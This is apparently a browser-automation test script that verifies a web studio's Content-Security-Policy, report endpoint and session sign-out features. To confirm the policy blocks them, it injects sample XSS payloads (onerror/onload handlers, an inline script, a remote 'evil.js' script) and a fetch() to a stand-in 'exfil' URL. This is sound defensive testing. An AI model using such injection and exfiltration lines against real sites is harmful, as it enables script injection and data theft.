#!/usr/bin/env python3
"""Content-Security-Policy (web/csp.py) and the session UI in a real browser (Playwright, run with /usr/bin/python3 on the host) against a
THROWAWAY studio container `cspui` (port 8119; removed at the end). Checks:
  - every view of the main page, the SQL editor with Monaco (from cdnjs), a query result, the manual (/docs/), Swagger (/api/docs) and
    a dashboard embed render with NO CSP violation and no page error;
  - the policy actually blocks: an inline event handler and an injected inline <script> inserted the way an x-html site would do it
    do not run, a script from a foreign host is not loaded, fetch() to a foreign host is refused, and each is reported to
    /api/csp-report;
  - the code-block copy button (formerly an inline onclick) still works;
  - "Signed-in sessions": the list shows both browsers, "Sign out everywhere else" signs the other one out; an administrator's
    "end sessions" button signs a user out.
CSP_MODE=report is checked too (header name only). Locally without outbound network from `docker run`: DOCKER_NETWORK=datakilnworks_default."""
import os, subprocess, sys, time, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import _ui_slow  # noqa: F401
from playwright.sync_api import sync_playwright
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__))); PORT = 8119; BASE = f"http://localhost:{PORT}"; NAME = "cspui"
HASH = "pbkdf2_sha256$100000$d08ef6c2826b1edc9dc90b321eea092d$e5fe10db63818165f3fef39c3d8bfb37a2ad54a29c96b4de42ca5605f964d73d"
IMAGE = os.getenv("CI_IMAGE", "localspark-lakehouse-notebook")
FAIL = []
def check(n, c, d=""):
    print(f"  [{'PASS' if c else 'FAIL'}] {n}" + (f" -> {str(d)[:400]}" if d and not c else ""))
    if not c: FAIL.append(n)
def sh(*a): return subprocess.run(list(a), capture_output=True, text=True)
def start(extra_env=()):
    sh("docker", "rm", "-f", NAME)
    args = ["docker", "run", "-d", "--name", NAME, "-p", f"{PORT}:8891", "-v", f"{ROOT}/web:/workspace/web", "-v", f"{ROOT}/docs:/workspace/docs", "-w", "/workspace",
            "-e", "WAREHOUSE_DIR=/workspace/warehouse", "-e", "DKW_SECRETS_DIR=/workspace/secrets", "-e", "INIT_ADMIN_USERNAME=admin", "-e", f"INIT_ADMIN_PASSWORD_HASH={HASH}", "-e", "LOGIN_THROTTLE=off"]
    for e in extra_env:
        args += ["-e", e]
    if os.getenv("DOCKER_NETWORK"):          # a plain `docker run` on a machine without outbound access cannot fetch DuckDB's delta extension
        args += ["--network", os.environ["DOCKER_NETWORK"]]
    r = sh(*args, IMAGE, "python", "-m", "uvicorn", "web.app:app", "--host", "0.0.0.0", "--port", "8891", "--no-proxy-headers")
    assert r.returncode == 0, r.stderr
    for _ in range(120):
        if sh("curl", "-sf", "-o", "/dev/null", f"{BASE}/healthz").returncode == 0 and \
           sh("docker", "exec", NAME, "python", "-c", "import sqlite3;sqlite3.connect('/workspace/secrets/auth.db').execute('select 1 from users')").returncode == 0:
            break
        time.sleep(1)
    sh("docker", "exec", NAME, "python", "-c", "import sqlite3;c=sqlite3.connect('/workspace/secrets/auth.db');c.execute('UPDATE users SET must_change_password=0');c.commit()")

VIOLATIONS_JS = """() => { window.__csp = []; document.addEventListener('securitypolicyviolation', e => window.__csp.push(
    {d: e.effectiveDirective, b: e.blockedURI, s: (e.sample || '').slice(0, 60), src: e.sourceFile})); }"""
def violations(page): return page.evaluate("() => window.__csp || []")

try:
    print("report-only mode")
    start(["CSP_MODE=report"])
    hdr = sh("curl", "-s", "-D", "-", "-o", "/dev/null", f"{BASE}/").stdout.lower()
    check("CSP_MODE=report sends Content-Security-Policy-Report-Only", "content-security-policy-report-only:" in hdr and "\ncontent-security-policy:" not in hdr, hdr[:600])
    start()
    with sync_playwright() as p:
        b = p.chromium.launch()
        ctx = b.new_context(viewport={"width": 1600, "height": 1000}); ctx.add_init_script(VIOLATIONS_JS.join(["(", ")()"]))
        page = ctx.new_page(); errs = []; page.on("pageerror", lambda e: errs.append(str(e)))
        check("admin logs in", ctx.request.post(f"{BASE}/api/auth/login", data={"username": "admin", "password": "adminpassword123"}).ok)
        resp = page.goto(BASE, wait_until="networkidle")
        csp = resp.headers.get("content-security-policy", "")
        check("the main page is served with an enforced CSP carrying a nonce and no 'unsafe-inline' for scripts",
              "'nonce-" in csp and "script-src 'self' 'nonce-" in csp and "'unsafe-inline'" not in csp.split("script-src")[1].split(";")[0], csp)
        page.wait_for_function("() => window.Alpine && Alpine.$data(document.body) && Alpine.$data(document.body).isAuthenticated", timeout=30000)
        print("every view renders without a violation")
        views = ["sql", "workspace", "experiments", "dashboards", "jobs", "catalog", "alerts", "queries", "lineage", "sql_warehouses", "playground",
                 "ingest", "genie", "autoloader", "apps", "recents", "history", "governance", "dbt", "compute"]
        for v in views:
            page.evaluate(f"() => {{ Alpine.$data(document.body).currentView = '{v}'; }}"); page.wait_for_timeout(1200)
        page.evaluate("() => { const d = Alpine.$data(document.body); d.currentView = 'sql'; }"); page.wait_for_timeout(1000)
        page.wait_for_function("() => window.monaco && window._monacoEditor", timeout=45000)
        check("the Monaco SQL editor loads from cdnjs", page.evaluate("() => !!document.querySelector('.monaco-editor')"))
        page.evaluate("() => { window._monacoEditor.setValue('SELECT 42 AS answer, \\'csp\\' AS word'); }")
        page.evaluate("() => { const d = Alpine.$data(document.body); (d.runQuery || d.executeQuery || d.runSql).call(d); }"); page.wait_for_timeout(4000)
        check("a query runs and its result is shown", "42" in page.inner_text("body"))
        for name, fn in (("IAM dialog", "openIamModal"), ("two-factor dialog", "openMfa"), ("sessions dialog", "openSessions"), ("settings", "openSettingsModal")):
            page.evaluate(f"() => {{ const d = Alpine.$data(document.body); if (d.{fn}) d.{fn}(); }}"); page.wait_for_timeout(1500)
            page.keyboard.press("Escape"); page.wait_for_timeout(400)
        v = violations(page)
        check("no CSP violation across all views, the editor and the dialogs", v == [], v[:8])
        check("no page errors", not errs, errs[:5])

        print("the policy blocks injected script")
        page.evaluate("""() => { window.__pwned = 0; const d = document.createElement('div');
            d.innerHTML = '<img src="/nonexistent.png" onerror="window.__pwned = 1"><svg onload="window.__pwned = 2"></svg>';
            document.body.appendChild(d); }"""); page.wait_for_timeout(1000)
        check("an inline event handler in inserted HTML does not run", page.evaluate("() => window.__pwned") == 0)
        page.evaluate("""() => { const s = document.createElement('script'); s.textContent = 'window.__pwned = 3'; document.body.appendChild(s); }"""); page.wait_for_timeout(500)
        check("an inline <script> without the nonce does not run", page.evaluate("() => window.__pwned") == 0)
        page.evaluate("""() => { const s = document.createElement('script'); s.src = 'https://example.com/evil.js'; document.body.appendChild(s); }"""); page.wait_for_timeout(1500)
        got = page.evaluate("""async () => { try { await fetch('https://example.com/exfil?x=1', {mode: 'no-cors'}); return 'sent'; } catch (e) { return 'blocked'; } }""")
        check("fetch() to another host is refused (connect-src 'self')", got == "blocked", got)
        v = violations(page)
        dirs = {x["d"] for x in v}
        check("each was reported as a violation (script-src-attr / script-src-elem / connect-src)", {"script-src-attr", "script-src-elem", "connect-src"} <= dirs, v)
        # the browser sends reports on its own schedule: poll the counters for up to 15 s (a wall-clock deadline, whatever UI_SLOW is)
        reached = lambda s: sum(s["counts"].values()) >= 3 and any("example.com" in k for k in s["counts"])
        deadline = time.monotonic() + 15
        while True:
            stats = ctx.request.get(f"{BASE}/api/csp-report").json()
            if reached(stats) or time.monotonic() > deadline:
                break
            time.sleep(0.5)
        check("the violations reached /api/csp-report", reached(stats), stats)
        if not reached(stats):
            # never sent, or sent and refused (401/403/429 from a gate)? The studio's access log and its "CSP violation" warnings say which.
            logs = (lambda r: r.stdout + r.stderr)(sh("docker", "logs", NAME))
            print("    studio log lines about CSP reports:")
            for line in [ln for ln in logs.splitlines() if "csp-report" in ln or "CSP violation" in ln][-30:] or ["    (none: the browser never reached /api/csp-report)"]:
                print("      " + line[:300])
        check("the report statistics are admin-only", b.new_context().request.get(f"{BASE}/api/csp-report").status in (401, 403))

        print("the code-block copy button (formerly inline onclick)")
        ctx.grant_permissions(["clipboard-read", "clipboard-write"], origin=BASE)
        page.evaluate("""() => { const d = Alpine.$data(document.body); d.currentView = 'playground'; }"""); page.wait_for_timeout(800)
        html = page.evaluate("() => (window.renderMarkdownCode || window.dkwRenderCodeBlock) ? 'fn' : ''")
        page.evaluate("""() => { const w = document.createElement('div'); w.className = 'playground-code-block'; w.id = 'cpt';
            w.innerHTML = '<button type="button" data-copy-code><span>Copy</span></button><pre><code>SELECT 1 -- copied</code></pre>'; document.body.appendChild(w); }""")
        page.click("#cpt [data-copy-code]"); page.wait_for_timeout(300)
        check("clicking it copies the code and shows 'Copied!'", page.inner_text("#cpt [data-copy-code] span") == "Copied!" and
              page.evaluate("() => navigator.clipboard.readText()") == "SELECT 1 -- copied")
        real = page.evaluate("() => document.querySelectorAll('[onclick]').length")
        check("no element of the page uses an inline onclick", real == 0, real)

        print("other pages")
        for path, label in (("/docs/", "manual"), ("/api/docs", "Swagger UI")):
            pg = ctx.new_page(); pe = []; pg.on("pageerror", lambda e: pe.append(str(e)))
            pg.goto(BASE + path, wait_until="networkidle"); pg.wait_for_timeout(2000)
            check(f"the {label} renders without a violation", violations(pg) == [] and not pe and len(pg.inner_text("body")) > 200, (violations(pg), pe))
            pg.close()
        r = ctx.request.post(f"{BASE}/api/dashboards", data={"name": "CSP dash", "description": "x"})
        did = (r.json().get("dashboard") or r.json()).get("id") if r.ok else None
        if did:
            payload = "<img src=x onerror=window.__pwned=1>"
            for w in ({"title": "Rows", "type": "table", "width": "col-span-4",
                       "query": f"SELECT '{payload}' AS label, 42 AS n UNION ALL SELECT 'b', 7"},
                      {"title": "Bars", "type": "bar", "width": "col-span-2", "query": "SELECT 'a' AS k, 3 AS v UNION ALL SELECT 'b', 5"}):
                rw = ctx.request.post(f"{BASE}/api/dashboards/{did}/widgets", data=w)
                check(f"widget '{w['title']}' added", rw.ok, rw.text()[:200])
            pg = ctx.new_page(); pe = []; pg.on("pageerror", lambda e: pe.append(str(e)))
            pg.goto(f"{BASE}/embed/dashboard/{did}", wait_until="networkidle")
            pg.wait_for_function("() => document.querySelectorAll('[data-testid=embed-widget] td').length >= 4", timeout=30000)
            pg.wait_for_timeout(800)
            check("a dashboard embed (now without CDNs) renders without a violation", violations(pg) == [] and not pe and "CSP dash" in pg.inner_text("body"), (violations(pg), pe))
            check("the embed shows the table widget's rows", "42" in pg.inner_text("[data-testid=embed-widget]"))
            check("an HTML value in the data is shown as text, not run", payload in pg.inner_text("body") and
                  pg.evaluate("() => !window.__pwned && !document.querySelector('.widget-content img')"))
            check("the bar widget draws a chart", pg.evaluate("() => !!document.querySelector('.widget-content canvas')"))
            pg.close()
            anon = b.new_context()
            check("the embed is refused without a session", anon.request.get(f"{BASE}/embed/dashboard/{did}").status == 401)
            anon.close()
        else:
            check("a dashboard could be created for the embed check", False, r.text[:200])

        print("signed-in sessions")
        ctx2 = b.new_context(); page2 = ctx2.new_page()
        check("a second browser signs in", ctx2.request.post(f"{BASE}/api/auth/login", data={"username": "admin", "password": "adminpassword123"}).ok)
        page2.goto(BASE, wait_until="networkidle")
        page.goto(BASE, wait_until="networkidle"); page.wait_for_function("() => window.Alpine && Alpine.$data(document.body).isAuthenticated", timeout=30000)
        page.locator("button[\\@click='userMenuOpen = !userMenuOpen']").first.click(); page.wait_for_timeout(400)
        page.click("[data-testid=menu-sessions]"); page.wait_for_selector("[data-testid=session-row]")
        rows = page.locator("[data-testid=session-row]").count()
        check("the dialog lists both browsers, this one marked", rows >= 2 and page.locator("[data-testid=session-current]:visible").count() == 1, rows)
        page.once("dialog", lambda d: d.accept()); page.click("[data-testid=sessions-revoke-others]"); page.wait_for_timeout(1500)
        check("'Sign out everywhere else' leaves only this browser", page.locator("[data-testid=session-row]").count() == 1)
        check("the other browser is signed out", ctx2.request.get(f"{BASE}/api/auth/me").json().get("authenticated") is False)
        check("this one is still signed in", ctx.request.get(f"{BASE}/api/auth/me").json().get("authenticated") is True)
        page.keyboard.press("Escape")
        ctx.request.post(f"{BASE}/api/users", data={"username": "ui_bob", "password": "bobpassword1", "display_name": "Bob", "role": "user"})
        ctx3 = b.new_context()
        check("bob signs in", ctx3.request.post(f"{BASE}/api/auth/login", data={"username": "ui_bob", "password": "bobpassword1"}).ok)
        page.evaluate("() => { const d = Alpine.$data(document.body); d.openIamModal(); }"); page.wait_for_timeout(2000)
        row = page.locator("tr", has_text="ui_bob")
        page.once("dialog", lambda d: d.accept()); row.locator("[data-testid=user-end-sessions]").click(); page.wait_for_timeout(1500)
        check("the administrator's 'end sessions' signs bob out", ctx3.request.get(f"{BASE}/api/auth/me").json().get("authenticated") is False)
        check("still no CSP violation and no page error", violations(page) == [] and not errs, (violations(page), errs[:3]))
        page.screenshot(path=os.path.join(os.getenv("ARTIFACT_DIR", "/tmp"), "csp_ui.png"))
        b.close()
finally:
    if FAIL:
        print(sh("docker", "logs", "--tail", "30", NAME).stderr[-3000:])
    sh("docker", "rm", "-f", NAME)
print(f"\n{'ALL PASSED' if not FAIL else f'{len(FAIL)} FAILED: {FAIL}'}")
sys.exit(1 if FAIL else 0)
